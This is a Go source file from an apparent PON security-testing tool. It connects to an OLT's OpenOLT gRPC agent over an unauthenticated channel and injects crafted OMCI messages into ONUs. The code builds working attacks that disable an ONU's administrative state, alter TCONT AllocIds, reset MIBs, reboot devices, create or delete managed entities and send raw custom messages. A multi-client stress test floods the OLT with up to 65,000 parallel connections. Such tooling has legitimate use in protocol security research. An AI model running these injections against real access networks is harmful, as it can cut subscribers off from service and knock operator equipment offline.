// Copyright 2025-present Fridolin Siegmund, Stefano Acquaviti
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package injector

import (
	"context"
	"encoding/hex"
	"errors"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/opencord/omci-lib-go/v2"
	"github.com/opencord/omci-lib-go/v2/generated"
	stub "github.com/opencord/voltha-protos/v5/go/openolt"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

// Attempts to inject a message with numerous parameters by attempting to send a message to the grpc agent on an OLT
func InjectMessage(oltIP string, timeout int, injectionType string, intfId uint32, onuId uint32, transactionID uint16, entityInstance uint16, entityClass uint16, commands int, attributes string, customMessage string) string {

	var result string

	// Create a new grpc client
	connect, err := grpc.NewClient(oltIP, grpc.WithTransportCredentials(insecure.NewCredentials()))

	if err != nil {
		println("NEW CLIENT ERROR: ", err.Error())
		return err.Error()
	}

	defer connect.Close()

	// Create a new openOLT client
	oltClient := stub.NewOpenoltClient(connect)

	// Set connection timeout
	timeoutContext, timeoutCancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer timeoutCancel()

	// Select type of injection according to parameter and call the appropriate injection function with the appropriate built message
	switch injectionType {
	case "OLT_GetOnuInfo":
		result = injectGetOnuInfo(oltClient, timeoutContext, intfId, onuId)
	case "OLT_GetOnuStatistics":
		result = injectGetOnuStatistics(oltClient, timeoutContext, intfId, onuId)
	case "OLT_GetDeviceInfo":
		result = injectGetDeviceInfo(oltClient, timeoutContext)
	case "OMCI_SetAllocId":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildSetRequestAlloc(transactionID, entityInstance))
	case "OMCI_SetAdminState0":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildSetRequestAdmin0(transactionID))
	case "OMCI_GetRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildGetRequest(transactionID, entityInstance, entityClass))
	case "OMCI_MibResetRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildMIBResetRequest(transactionID))
	case "OMCI_MIBUploadRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildMIBUploadRequest(transactionID))
	case "OMCI_RebootRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildRebootRequest(transactionID))
	case "OMCI_GetAllAlarmsRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildGetAllAlarmsRequest(transactionID))
	case "OMCI_CustomMessage":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, customMessage)
	case "OMCI_SetRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildSetRequest(transactionID, entityInstance, entityClass, attributes))
	case "OMCI_MIBUploadProcess":
		result = buildMIBUploadProcess(oltClient, context.Background(), intfId, onuId, transactionID, commands)
	case "OMCI_CreateRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildCreateRequest(transactionID, entityInstance, entityClass, attributes))
	case "OMCI_DeleteRequest":
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, buildDeleteRequest(transactionID, entityInstance, entityClass))
	case "OMCI_Stresstest":
		result = buildStresstest(oltClient, context.Background(), intfId, onuId, transactionID, commands, timeout, nil)
	case "OMCI_StresstestMulti":
		result = buildStresstestMulti(oltIP, intfId, onuId, transactionID, commands, timeout, attributes)
	default:
		result = "Unknown Injection"
	}

	return result
}

// Builds an OMCI message from an OMCI struct/layer and a gopacket layer corresponding to the desired type of message
func buildMessage(omciPart *omci.OMCI, messagetype gopacket.SerializableLayer) string {

	var options gopacket.SerializeOptions
	options.FixLengths = true

	// Combine and serialize the omci and messagetype layers to create the message bytes
	buffer := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(buffer, options, omciPart, messagetype)

	if err != nil {
		println("ERROR: ", err.Error())
		return ("ERROR: " + err.Error())
	}

	// Convert the bytes into a string representation
	message := buffer.Bytes()
	messageString := hex.EncodeToString(message)

	// println(messageString)

	return messageString
}

// Injects a grpc call to request onu information for a given onu
func injectGetOnuInfo(oltClient stub.OpenoltClient, timeoutContext context.Context, intfId uint32, onuId uint32) string {

	// Send GetOnuInfo grpc call
	response, err := oltClient.GetOnuInfo(timeoutContext, &stub.Onu{IntfId: intfId, OnuId: onuId})

	if err != nil {
		println("ONU INFO SEND ERROR: ", err.Error())
		return err.Error()
	}

	return response.String()
}

// Injects a grpc call to request onu statistics for a given onu
func injectGetOnuStatistics(oltClient stub.OpenoltClient, timeoutContext context.Context, intfId uint32, onuId uint32) string {

	// Send GetOnuStatistics grpc call
	response, err := oltClient.GetOnuStatistics(timeoutContext, &stub.Onu{IntfId: intfId, OnuId: onuId})

	if err != nil {
		println("ONU STATS SEND ERROR: ", err.Error())
		return err.Error()
	}

	return response.String()
}

// Injects a grpc call to request device information from the olt
func injectGetDeviceInfo(oltClient stub.OpenoltClient, timeoutContext context.Context) string {

	// Send GetDeviceInfo grpc call
	response, err := oltClient.GetDeviceInfo(timeoutContext, &stub.Empty{})

	if err != nil {
		println("DEVICE INFO SEND ERROR: ", err.Error())
		return err.Error()
	}

	return response.String()
}

// Injects a given OMCI message for a given onu by sending the appropriate grpc call to the olt
func injectOmciMessage(oltClient stub.OpenoltClient, timeoutContext context.Context, intfId uint32, onuId uint32, omciMessage string) string {

	// Return if error previously
	if strings.HasPrefix(omciMessage, "ERROR:") {
		return omciMessage
	}

	// Create open olt OMCI message struct
	oltMessage := stub.OmciMsg{
		IntfId: intfId,
		OnuId:  onuId,
		Pkt:    []byte(omciMessage),
	}

	// Send OmciMsgOut grpc call with the OMCI message, response is error or empty
	_, err := oltClient.OmciMsgOut(timeoutContext, &oltMessage)

	if err != nil {
		return err.Error()
	}

	return "OMCI message injected!"
}

// Builds a SetRequest OMCI message attempting to set an ONU's AdministrativeState to 0
func buildSetRequestAdmin0(tid uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.SetRequestType,
	}

	// Build SetRequest layer
	messagetype := &omci.SetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuGClassID,
			EntityInstance: uint16(0),
		},
		// AttributeMask specifies which attribute to be manipulated
		AttributeMask: uint16(0x200),
		Attributes:    generated.AttributeValueMap{"AdministrativeState": byte(0)},
	}

	return buildMessage(omciPart, messagetype)
}

// Builda a GetRequest OMCI message attempting to retrieve all attributes of a managed entity
func buildGetRequest(tid uint16, instanceId uint16, classId uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.GetRequestType,
	}

	// Try to retreive information about the specified managed entity to allow reading of it's AttributeMask
	meDef, err := generated.LoadManagedEntityDefinition(generated.ClassID(classId))

	if err.GetError() != nil {
		return err.GetError().Error()
	}

	// Build GetRequest layer
	messagetype := &omci.GetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.ClassID(classId),
			EntityInstance: instanceId,
		},
		// Specify retrieval of all attributes
		AttributeMask: meDef.GetAllowedAttributeMask(),
	}

	return buildMessage(omciPart, messagetype)
}

// Build a SetRequest OMCI message attempting to manipulate given attributes (only numbers and strings supported)
func buildSetRequest(tid uint16, instanceId uint16, classId uint16, attributes string) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.SetRequestType,
	}

	// Try to retreive information about the specified managed entity to allow reading of it's AttributeMask
	meDef, omciErr := generated.LoadManagedEntityDefinition(generated.ClassID(classId))

	if omciErr.GetError() != nil {
		return "ERROR: " + omciErr.GetError().Error()
	}

	// Try to parse given attributes
	attributeDefinitions := meDef.GetAttributeDefinitions()
	attributesParsed, err := parseAttributes(attributes, attributeDefinitions)

	if err != nil {
		println(err.Error())
		return "ERROR: " + err.Error()
	}

	// Try to build attribute mask
	attributeMask := uint16(0)
	for attribute, _ := range attributesParsed {
		definition, _ := generated.GetAttributeDefinitionByName(attributeDefinitions, attribute)
		attributeMask = attributeMask | definition.Mask
	}

	// Build SetRequest layer
	messagetype := &omci.SetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.ClassID(classId),
			EntityInstance: instanceId,
		},
		// Specify manipulation of AllocId
		AttributeMask: attributeMask,
		Attributes:    attributesParsed,
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a SetRequest OMCI message attempting to set an ONU's TCONT's AllocId to a different value
func buildSetRequestAlloc(tid uint16, instanceId uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.SetRequestType,
	}

	// Build SetRequest layer
	messagetype := &omci.SetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.TContClassID,
			EntityInstance: instanceId,
		},
		// Specify manipulation of AllocId
		AttributeMask: uint16(0x8000),
		Attributes:    generated.AttributeValueMap{"AllocId": uint16(42)},
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a MIBResetRequest OMCI message attempting to reset an ONU's MIB
func buildMIBResetRequest(tid uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.MibResetRequestType,
	}

	// Build MIBResetRequest layer
	messagetype := &omci.MibResetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuDataClassID,
			EntityInstance: uint16(0),
		},
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a MIBUploadRequest OMCI message attempting to start a MIB upload process
func buildMIBUploadRequest(tid uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.MibUploadRequestType,
	}

	// Build MIBUploadRequest layer
	messagetype := &omci.MibUploadRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuDataClassID,
			EntityInstance: uint16(0),
		},
	}

	return buildMessage(omciPart, messagetype)
}

// Builds the number of MIBUploadNextequest messages specified by commands to create a Mib Upload Process
func buildMIBUploadProcess(oltClient stub.OpenoltClient, timeoutContext context.Context, intfId uint32, onuId uint32, tid uint16, commands int) string {

	result := "No. commands is 0!"

	// Inject one message per command
	for i := 0; i < commands; i++ {
		// Build OMCI layer
		omciPart := &omci.OMCI{
			TransactionID: tid + uint16(i),
			MessageType:   omci.MibUploadNextRequestType,
		}

		// Build MIBUploadNextRequest layer
		messagetype := &omci.MibUploadNextRequest{
			MeBasePacket: omci.MeBasePacket{
				EntityClass:    generated.OnuDataClassID,
				EntityInstance: uint16(0),
			},
			CommandSequenceNumber: uint16(i),
		}

		// Build and inject message
		message := buildMessage(omciPart, messagetype)
		result = injectOmciMessage(oltClient, timeoutContext, intfId, onuId, message)
	}

	return result
}

// Builds a RebootRequest OMCI message attempting to initiate a reboot of a specified ONU
func buildRebootRequest(tid uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.RebootRequestType,
	}

	// Build RebootRequest layer
	messagetype := &omci.RebootRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuGClassID,
			EntityInstance: uint16(0),
		},
		RebootCondition: byte(0),
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a GetAllAlarmsRequest attempting to retrieve all alarms from the olt
func buildGetAllAlarmsRequest(tid uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.GetAllAlarmsRequestType,
	}

	// Build GetAllAlarmsRequest layer
	messagetype := &omci.GetAllAlarmsRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuDataClassID,
			EntityInstance: uint16(0),
		},
		AlarmRetrievalMode: byte(0),
	}

	return buildMessage(omciPart, messagetype)
}

// Build a CreateRequest OMCI message attempting to create a ME with given attributes (only numbers and strings supported)
func buildCreateRequest(tid uint16, instanceId uint16, classId uint16, attributes string) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.CreateRequestType,
	}

	// Try to retreive information about the specified managed entity to allow reading of it's AttributeMask
	meDef, omciErr := generated.LoadManagedEntityDefinition(generated.ClassID(classId))

	if omciErr.GetError() != nil {
		return "ERROR: " + omciErr.GetError().Error()
	}

	// Try to parse given attributes
	attributeDefinitions := meDef.GetAttributeDefinitions()
	attributesParsed, err := parseAttributes(attributes, attributeDefinitions)

	if err != nil {
		println(err.Error())
		return "ERROR: " + err.Error()
	}

	// Build CreateRequest layer
	messagetype := &omci.CreateRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.ClassID(classId),
			EntityInstance: instanceId,
		},
		Attributes: attributesParsed,
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a DeleteRequest attempting to delete a ME from an ONU
func buildDeleteRequest(tid uint16, instanceId uint16, classId uint16) string {

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.DeleteRequestType,
	}

	// Build DeleteRequest layer
	messagetype := &omci.DeleteRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.ClassID(classId),
			EntityInstance: instanceId,
		},
	}

	return buildMessage(omciPart, messagetype)
}

// Builds a number of GetRequest messages to flood the network
func buildStresstest(oltClient stub.OpenoltClient, timeoutContext context.Context, intfId uint32, onuId uint32, tid uint16, commands int, timeout int, resultChannel chan resultStruct) string {

	if commands <= 0 {
		return "No. commands is 0!"
	}

	// Try to retreive information about the OnuG managed entity to allow reading of it's AttributeMask
	meDef, err := generated.LoadManagedEntityDefinition(generated.OnuDataClassID)

	if err.GetError() != nil {
		return err.GetError().Error()
	}

	// Build OMCI layer
	omciPart := &omci.OMCI{
		TransactionID: tid,
		MessageType:   omci.GetRequestType,
	}

	// Build GetRequest layer
	messagetype := &omci.GetRequest{
		MeBasePacket: omci.MeBasePacket{
			EntityClass:    generated.OnuDataClassID,
			EntityInstance: uint16(0),
		},
		AttributeMask: meDef.GetAllowedAttributeMask(),
	}

	var messages []string

	// Build one message per command
	for i := 0; i < commands; i++ {

		// Tid 0 is reserved, so skip it
		if tid+uint16(i) == 0 {
			i++
			commands++
		}

		// Set current transaction ID
		omciPart.TransactionID = tid + uint16(i)

		// Build and append message
		messages = append(messages, buildMessage(omciPart, messagetype))
	}

	startTime := time.Now()
	counter := 0

	// Inject all built messages
	for _, message := range messages {

		injectOmciMessage(oltClient, timeoutContext, intfId, onuId, message)

		/*if result != "OMCI message injected!" {
			println(result)
			break
		}*/

		counter++

		if time.Since(startTime).Seconds() > float64(timeout) {
			break
		}

	}

	// Calculate messages per second
	elapsedTime := time.Since(startTime).Seconds()
	messagesPerSecond := float64(counter) / elapsedTime

	// Write result into channel if parallel stresstest
	if resultChannel != nil {
		resultChannel <- resultStruct{count: counter, mps: messagesPerSecond}
	}

	return "Injected " + strconv.Itoa(counter) + " messages in " + strconv.FormatFloat(elapsedTime, 'f', 3, 64) + " seconds! (" + strconv.FormatFloat(messagesPerSecond, 'f', 3, 64) + " msg/s)"
}

type resultStruct struct {
	count int
	mps   float64
}

func buildStresstestMulti(oltIP string, intfId uint32, onuId uint32, tid uint16, commands int, timeout int, processes string) string {

	// Retrieve number of parallel processes/clients
	totalProcesses, err := strconv.Atoi(processes)

	if err != nil {
		return "PROCESSES ERROR: " + err.Error()
	}

	if totalProcesses <= 0 || totalProcesses > 65000 {
		return "Bad number of clients!"
	}

	resultChannel := make(chan resultStruct)
	totalCount := 0
	totalMps := float64(0)
	totalClients := uint16(totalProcesses)
	tidInterval := 65000 / totalClients
	startTime := time.Now()

	for i := uint16(0); i < totalClients; i++ {

		// Create a new grpc client
		connect, err := grpc.NewClient(oltIP, grpc.WithTransportCredentials(insecure.NewCredentials()))

		if err != nil {
			println("NEW CLIENT ERROR: ", err.Error())
			return err.Error()
		}

		defer connect.Close()

		// Create a new openOLT client
		oltClient := stub.NewOpenoltClient(connect)

		// Call stresstest goroutine
		go buildStresstest(oltClient, context.Background(), intfId, onuId, tid+(i*tidInterval), commands, timeout, resultChannel)
	}

	// Retrieve results of all stresstest goroutines from channel
	for i := uint16(0); i < totalClients; i++ {
		result := <-resultChannel
		totalCount += result.count
		totalMps += result.mps
	}

	elapsedTime := time.Since(startTime).Seconds()

	return "Injected " + strconv.Itoa(totalCount) + " messages in " + strconv.FormatFloat(elapsedTime, 'f', 3, 64) + " seconds! (" + strconv.FormatFloat(totalMps, 'f', 3, 64) + " msg/s)"
}

// Attempts to parse given attributes, only strings and numbers supported, experimental, may crash
func parseAttributes(attributes string, definitions generated.AttributeDefinitionMap) (generated.AttributeValueMap, error) {

	if attributes == "" {
		return nil, errors.New("attribute list is empty")
	}

	// Map of attrbiutes of any type
	attributesMap := make(generated.AttributeValueMap)

	// Split different assignments
	attributes = strings.ReplaceAll(attributes, " ", "")
	keyValue := strings.Split(attributes, ",")

	var err error

	// For each assignment
	for _, pair := range keyValue {
		// Split key,value
		attribute := strings.Split(pair, "=")
		// If both exist...
		if len(attribute) >= 2 {
			// Try to retrieve attribute information for key
			definition, err := generated.GetAttributeDefinitionByName(definitions, attribute[0])

			if err != nil {
				println(err.Error())
				return nil, err
			} else {
				// If it's a string type, just put in the value
				if definition.AttributeType == generated.StringAttributeType {
					attributesMap[attribute[0]] = attribute[1]
					// If it's not one of the octect, bytes, or bit types, convert to int first
				} else {
					if definition.AttributeType != generated.BitFieldAttributeType && definition.AttributeType != generated.OctetsAttributeType && definition.AttributeType != generated.TableAttributeType {
						attributesMap[attribute[0]], err = strconv.Atoi(attribute[1])
						if err != nil {
							println(err.Error())
							return nil, err
						}
					}
				}
			}
		}
	}

	return attributesMap, err
}
